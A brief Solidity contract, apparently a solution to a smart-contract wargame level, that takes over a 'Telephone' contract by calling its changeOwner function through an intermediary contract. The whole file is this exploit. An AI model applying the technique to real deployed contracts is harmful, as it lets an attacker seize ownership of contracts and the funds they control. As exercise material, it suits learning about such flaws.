// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./origin.sol";

contract attacker {

    Telephone telContract;

    constructor (address _ori){
        telContract = Telephone(_ori);
    }

    function attack(address _user) public {
        telContract.changeOwner(_user);
    }

}